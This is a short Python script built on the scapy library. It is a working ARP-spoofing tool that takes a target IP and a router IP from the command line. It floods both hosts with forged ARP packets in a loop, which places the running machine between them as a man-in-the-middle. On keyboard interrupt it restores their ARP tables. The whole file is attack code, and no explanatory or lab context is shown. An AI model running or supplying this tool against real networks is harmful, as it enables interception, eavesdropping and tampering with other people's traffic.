from scapy.all import *
import sys

from scapy.layers.l2 import ARP, getmacbyip


def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op="who-has", psrc=source_ip,
                 hwdst=dest_mac, pdst=dest_ip)

    send(packet, verbose=False)


def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op="is-at", hwsrc=source_mac,
                 psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)

    send(packet, verbose=False)


def main():
    target_ip = sys.argv[1]
    router_ip = sys.argv[2]

    victim_mac = getmacbyip(target_ip)
    router_mac = getmacbyip(router_ip)
    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(target_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, target_ip)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, target_ip, victim_mac)
        arp_restore(target_ip, victim_mac, router_ip, router_mac)
        quit()


main()
